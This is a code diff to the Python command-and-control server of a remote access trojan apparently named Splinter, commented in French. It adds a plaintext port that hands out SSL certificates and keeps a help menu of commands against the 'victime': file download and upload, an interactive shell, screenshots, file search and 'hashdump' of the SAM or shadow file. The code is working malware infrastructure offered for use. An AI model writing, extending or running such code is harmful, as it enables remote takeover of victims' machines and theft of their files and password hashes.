@@ -3,9 +3,9 @@ import ssl
 import subprocess
 import socket 
 import os
+import threading
 from command import handle_command
-from colorama import Fore, Style, init
-
+from colorama import Fore, Style
 
 def colorama_etoile():
     etoile = Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "*" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "
@@ -14,6 +14,31 @@ def colorama_plus():
     plus = Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "+" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "
     return plus
 
+# Gère les clients non sécurisés, utilisé pour la distribution de certificats SSL
+def handle_non_secure_client(client_socket):
+    print(f"{colorama_etoile()}Connexion non sécurisée établie pour la récupération du certificat")
+    try:
+        data = client_socket.recv(1024).decode('utf-8')
+        if data == 'GET_CERT':
+            cert_path = os.path.join(os.path.dirname(__file__), 'server.crt')
+            with open(cert_path, 'rb') as cert_file:
+                client_socket.sendall(cert_file.read()) # Envoie le certificat SSL au client
+            print(f"{colorama_etoile()}Certificat envoyé au client")
+    finally:
+        client_socket.close() # Ferme la connexion après l'envoi
+
+# Lance un serveur non sécurisé spécifiquement pour la récupération de certificat SSL par les clients
+def start_non_secure_server():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.bind(('0.0.0.0', 8890))
+        sock.listen()
+        print(f"\n{colorama_etoile()}Serveur non sécurisé en écoute sur le port {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}8890{Style.RESET_ALL}{Fore.RED}{Style.DIM} pour la récupération de certificat")
+        while True:
+            client, addr = sock.accept()
+            print(f"{colorama_plus()}Connexion non sécurisée acceptée de {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{addr}{Style.RESET_ALL}{Fore.RED}{Style.DIM}")
+            threading.Thread(target=handle_non_secure_client, args=(client,)).start() # Crée un thread pour chaque client
+
+# Affiche le menu d'aide
 def show_help():
     help_text = print(f"""{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}                                        _   _      _       
                                        | | | | ___| |_ __  
@@ -28,36 +53,37 @@ Voici la liste des commandes disponible sur {Style.RESET_ALL}{Fore.GREEN}{Style.
 
 =================================================================================================
                                                    
-{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}help{Style.RESET_ALL}{Fore.RED}{Style.DIM} : afficher la liste des commandes disponibles.
-{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}download [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers de la victime vers le serveur.
-{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}upload [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers du serveur vers la victime.
-{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}shell{Style.RESET_ALL}{Fore.RED}{Style.DIM} : ouvrir un shell (bash ou cmd) interactif.
-{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}ipconfig{Style.RESET_ALL}{Fore.RED}{Style.DIM} : obtenir la configuration réseau de la machine victime.
-{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}screenshot{Style.RESET_ALL}{Fore.RED}{Style.DIM} : prendre une capture d'écran de la machine victime.
-{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}search [mot a rechercher] [chemin de recherche]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : rechercher un fichier sur la machine victime.
-{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}hashdump{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupérer la base SAM ou le fichier shadow de la machine.
+{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}help{Style.RESET_ALL}{Fore.RED}{Style.DIM} : afficher la liste des commandes disponibles
+{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}download [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers de la victime vers le serveur
+{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}upload [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers du serveur vers la victime
+{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}shell{Style.RESET_ALL}{Fore.RED}{Style.DIM} : ouvrir un shell (bash ou cmd) interactif
+{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}ipconfig{Style.RESET_ALL}{Fore.RED}{Style.DIM} : obtenir la configuration réseau de la machine victime
+{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}screenshot{Style.RESET_ALL}{Fore.RED}{Style.DIM} : prendre une capture d'écran de la machine victime
+{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}search [mot a rechercher] [chemin de recherche]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : rechercher un fichier sur la machine victime
+{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}hashdump{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupérer la base SAM ou le fichier shadow de la machine
 
 =================================================================================================            
                  """)
 
+# Crée un répertoire pour chaque client basé sur son adresse IP pour organiser les fichiers reçus/envoyés
 def create_client_directory(client_ip):
     directory_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), client_ip)
     if not os.path.exists(directory_path):
         os.makedirs(directory_path)
     return directory_path
 
-
+# Crée le serveur sécurisé pour la communication principale avec le client
 def create_server(port, certfile, keyfile):
     try:
         context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        context.load_cert_chain(certfile, keyfile)
+        context.load_cert_chain(certfile, keyfile) # Charge le certificat et la clé privée
 
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
             sock.bind(('0.0.0.0', port))
             sock.listen(5)
             with context.wrap_socket(sock, server_side=True) as ssock:
-                print(f"\n{colorama_etoile()}En écoute sur le port : {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{port}{Style.RESET_ALL}{Fore.RED}{Style.DIM}...")
-                conn, addr = ssock.accept()
+                print(f"{colorama_etoile()}Serveur sécurisé en écoute sur le port {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{port}{Style.RESET_ALL}{Fore.RED}{Style.DIM}...")
+                conn, addr = ssock.accept() # Accepte une connexion
                 client_ip = addr[0]  # Récupère l'adresse IP du client
                 client_directory = create_client_directory(client_ip)
                 os_type = conn.recv(1024).decode('utf-8')
@@ -77,7 +103,7 @@ def create_server(port, certfile, keyfile):
     except Exception as e:
         print(f"Erreur inattendue : {e}")
 
-#Obtention de l'adresse IP de l'utilisateur
+# Obtention de l'adresse IP de l'utilisateur
 def get_local_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -89,12 +115,12 @@ def get_local_ip():
         print(f"Erreur lors de la récupération de l'adresse IP : {e}")
         return None
 
-# Création du certificat
+# Configure les certificats SSL pour le serveur, génére de nouveaux certificats si nécessaire
 def setup_ssl_certificates(cert_file, key_file, config_file):
     local_ip = get_local_ip()
     print(Fore.RED + Style.DIM + "Voici l'IP que Splinter a récupérée : " + Style.RESET_ALL + Fore.GREEN + Style.DIM + local_ip + Style.RESET_ALL + Fore.RED + Style.DIM +"\n\n=================================================================================================") 
     if not local_ip:
-        print(Fore.RED + Style.DIM + "Impossible de déterminer l'adresse IP locale. Abandon de la création du certificat.")
+        print(Fore.RED + Style.DIM + "Impossible de déterminer l'adresse IP locale. Abandon de la création du certificat")
         return
 
     script_dir = os.path.dirname(os.path.realpath(__file__))
